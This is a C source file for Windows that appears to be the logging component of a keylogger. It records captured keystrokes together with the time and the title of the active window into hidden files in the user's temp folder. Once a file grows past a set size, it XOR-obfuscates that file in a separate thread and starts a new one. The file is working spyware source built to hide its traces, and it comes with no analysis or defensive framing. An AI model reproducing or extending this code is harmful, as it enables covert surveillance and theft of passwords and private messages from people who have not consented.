#include <windows.h>
#include <wchar.h>
#include "logging.h"
#include "config.h"


/****** Debugging ******/
/* Debug message */
void DebugMessage(LPCWSTR debugMessage)
{
	if (DEBUG)
	{
		if (DEBUG_MSGBOX)
			MessageBoxW(NULL, debugMessage, L"DEBUG MSG", MB_OK);
		if (DEBUG_LOG)
			Log(debugMessage, LOG_DEBUG_PATH);
	}
}
/******************************/

/****** Temp file ******/
/* Set new temp file */
void SetNewTempFilePath()
{
	WCHAR wcTempDir[MAX_PATH] = { 0 };
	WCHAR wcTempFileFullPath[MAX_PATH] = { 0 };
	// wcTempDir ==> "C:\Users\USERNAME\AppData\Local\Temp\"
	GetTempPathW(MAX_PATH, wcTempDir);
	// wcTempFileFullPath ==> "C:\Users\USERNAME\AppData\Local\Temp\PIE23dasdasd.TMP"
	GetTempFileNameW(wcTempDir, LOG_KEYS_PREFIX_PATH, 0, wcTempFileFullPath);
	// Set file to be hidden
	SetFileAttributesW(wcTempFileFullPath, FILE_ATTRIBUTE_HIDDEN);
	// Copy the new temp file path to the global var
	wcscpy_s(gwcCurrentLogFilePath, MAX_PATH, wcTempFileFullPath);
}
/* Will return a pointer to the current temp file path */
WCHAR * GetTempFilePath()
{
	// Temp file is not initalized yet, so create new temp file
	if (lstrlenW(gwcCurrentLogFilePath) == 0)
		SetNewTempFilePath();

	return gwcCurrentLogFilePath;
}
/******************************/



/* Encrypt a given file name */
// We probably need to dealloc 'lpLogFilePath'...
void EncryptFile_XOR(LPCWSTR lpLogFilePath)
{
	DebugMessage(L"EncryptFile_XOR");

	HANDLE hFile = CreateFileW(lpLogFilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwNumberOfBytes = 0;
		byte bBuffer = 0;
		while (ReadFile(hFile, &bBuffer, 1, &dwNumberOfBytes, NULL) && dwNumberOfBytes > 0)
		{
			// "Encrypt" (Xoring..)
			bBuffer ^= ENC_XOR_KEY;
			// Go back 1 byte and write back to file
			SetFilePointer(hFile, -1, NULL, FILE_CURRENT);
			WriteFile(hFile, &bBuffer, 1, &dwNumberOfBytes, NULL);
		}
		CloseHandle(hFile);
	}
	else
	{
		DebugMessage(L"CreateFileW failed");
	}
}



/* Write data to file and check if file exceeded a certain amount of data, 
	if so, encrypt the file. */
void LogAndEncrypt(LPCWSTR lpDataToLog)
{
	// Check file size, if it's more than XXX bytes, then:
	//	1. Create new thread to encrypt it.
	//	2. Generate new file path in %TEMP%.
	// Next, log the new data.
	HANDLE hFile;
	DWORD dwFileSize;
	WCHAR wcOldFilePath[MAX_PATH] = { 0 };
	hFile = CreateFileW(GetTempFilePath(), GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwFileSize = GetFileSize(hFile, NULL);
		CloseHandle(hFile);
		if (dwFileSize >= FILE_SIZE_TO_ENC)
		{
			// Save the previous file path
			wcscpy_s(wcOldFilePath, MAX_PATH, GetTempFilePath());

			// Create new file to store the keyloggings
			SetNewTempFilePath();
			
			// Encrypt the old file (lpLogFilePath)
			// We must duplicate the string to a the heap because this function's stack will die
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EncryptFile_XOR, wcsdup(wcOldFilePath), 0, NULL);
		}
		// Finally, Log the keyloggings
		Log(lpDataToLog, GetTempFilePath());
	}

}

/* Simply write data to file */
void Log(LPCWSTR lpDataToLog, LPCWSTR lpLogFilePath)
{
	HANDLE hFile;
	HANDLE foregroundWindowHandle;
	DWORD dwNumberOfBytes = 0;
	WCHAR wcForegroundWindowName[BUFFER_SIZE] = { 0 };
	WCHAR wcTimeString[BUFFER_SIZE] = { 0 };
	WCHAR wcBufferToWrite[BUFFER_SIZE_BIG] = { 0 };
	SYSTEMTIME stSystemTime;

	// Make sure we have some keys to log
	if (lstrlenW(lpDataToLog) == 0)
	{
		DebugMessage(L"LogKey got called with 'lstrlenW(lpDataToLog) == 0'");
		return;
	}

	// Get current foreground window name
	foregroundWindowHandle = GetForegroundWindow();
	GetWindowTextW(foregroundWindowHandle, wcForegroundWindowName, BUFFER_SIZE);

	// Get current time string
	GetLocalTime(&stSystemTime);
	swprintf_s(wcTimeString, BUFFER_SIZE, L"%.2u\\%.2u\\%.2u %.2u:%.2u:%.2u", stSystemTime.wDay, stSystemTime.wMonth, stSystemTime.wYear, stSystemTime.wHour, stSystemTime.wMinute, stSystemTime.wSecond);

	// Overall buffer to write
	swprintf_s(wcBufferToWrite, BUFFER_SIZE_BIG, L"%s ('%s'):\t %s\r\n", wcTimeString, wcForegroundWindowName, lpDataToLog);

	hFile = CreateFileW(lpLogFilePath,
		FILE_APPEND_DATA,		// Append data
		0,						// Do not share access
		NULL,					// No Security
		OPEN_ALWAYS,			// If doesn't exists - create new
		FILE_ATTRIBUTE_HIDDEN,	// Hidden file
		NULL);					// No attributes
	if (hFile != INVALID_HANDLE_VALUE)
	{

		if (!WriteFile(hFile, wcBufferToWrite, lstrlenW(wcBufferToWrite) * sizeof(WCHAR), &dwNumberOfBytes, NULL))
		{
			// Fail
			DebugMessage(L"WriteFile failed");
		}
	}
	else
	{
		// Fail
		DebugMessage(L"CreateFileW failed");
		return;
	}
	CloseHandle(hFile);
}
/*************************/